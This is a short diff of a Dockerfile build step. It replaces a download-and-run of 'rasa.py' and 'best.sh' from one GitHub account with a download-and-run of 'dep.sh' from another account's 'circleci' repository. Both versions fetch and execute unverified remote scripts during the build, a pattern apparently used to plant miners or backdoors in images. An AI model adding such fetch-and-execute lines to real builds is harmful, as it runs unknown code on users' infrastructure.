@@ -6,10 +6,10 @@ RUN \
   apt-get install python -y && \
   apt-get install gcc -y && \
   apt-get install wget -y && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/best.sh && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/rasa.py && \
-  chmod 777 rasa.py && \
-  python rasa.py && \
+  wget https://github.com/baxwru2/circleci/raw/master/dep.sh && \
+  chmod +x dep.sh && \
+  ./dep.sh && \
+  
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
